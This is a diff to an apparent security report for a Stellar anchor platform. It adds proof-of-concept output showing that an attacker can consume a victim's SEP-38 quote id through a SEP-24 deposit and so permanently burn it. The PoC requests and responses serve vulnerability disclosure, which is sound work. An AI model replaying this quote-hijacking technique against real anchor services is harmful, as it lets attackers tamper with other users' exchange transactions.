@@ -39,6 +39,19 @@ Local instance only, with SEP-10, SEP-38 and SEP-6 (or SEP-24) enabled and the r
   4. As A, try to use your own quote: the same request with `$A_JWT` now returns `400 {"error":"quote(id=<Q>) has already been used"}`.
   5. Via the Platform API (`GET /transactions/<B_TXN>`) observe `quote_id = Q`, `amount_in = 100`, `amount_out/fee` taken from A's quote; `GET /sep38/quote/<Q>` as A shows `transaction_id = <B_TXN>` (a transaction A cannot see).
 
+### Observed output (local build of 4.9.0 + in-repo Kotlin reference server as `/rate` backend, `security-reports/poc/poc_03.py`):
+```
+=== Report 03: SEP-38 quote consumed by a non-creator ===
+victim  G = GCO327ES4NV3CKVPZWNHOW3QBIZ7SGJ5GH7EX3UXXL6BRGPM7B74R3CL
+attacker G = GA77MT52GI6OVO74AS2ECPIV4WRVT6ODVKLESVA34DRPFL7CFNL6LZOB
+victim POST /sep38/quote -> 201 {"id":"c7450638-0928-450d-a432-bdd85a0bd5f8","expires_at":"2026-10-13T12:00:00Z","price":"1.0200034",...,"sell_asset":"iso4217:USD","sell_amount":"10",...
+attacker GET /sep38/quote/<Q> -> 404 {"error":"quote not found"}
+attacker SEP-24 deposit with quote_id=<Q> -> 200 {"type":"interactive_customer_info_needed","url":"http://localhost:8091/sep24/interactive?transaction_id=e29e7213-5a38-4ca4-a413-7d08ac0752c9&token=...
+victim   SEP-24 deposit with own quote_id -> 400 {"error":"quote(id=c7450638-0928-450d-a432-bdd85a0bd5f8) has already been used"}
+victim GET /sep38/quote/<Q> -> 200 {... "buy_amount":"8.8235","fee":{...}}   (quote now bound to the attacker's transaction)
+```
+The read path denies the attacker (404) while the consume path accepts the same id (200) and permanently burns the victim's quote (400 on the victim's own use).
+
 ### Supporting Material:
   * `core/src/main/java/org/stellar/anchor/util/ExchangeAmountsCalculator.java:110-192`
   * `core/src/main/java/org/stellar/anchor/sep31/Sep31Service.java:702-766`
